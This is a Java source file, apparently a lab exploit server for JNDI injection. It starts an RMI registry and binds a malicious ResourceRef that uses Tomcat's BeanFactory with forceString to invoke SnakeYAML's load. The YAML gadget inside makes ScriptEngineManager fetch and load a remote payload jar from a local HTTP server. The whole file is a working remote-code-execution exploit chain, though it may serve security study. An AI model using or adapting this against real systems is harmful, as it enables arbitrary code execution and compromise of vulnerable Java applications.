package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class YamlServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1100);
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");

        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("yaml", referenceWrapper);  // 绑定目录名
        System.out.println("Server Start on 1100...");
    }
}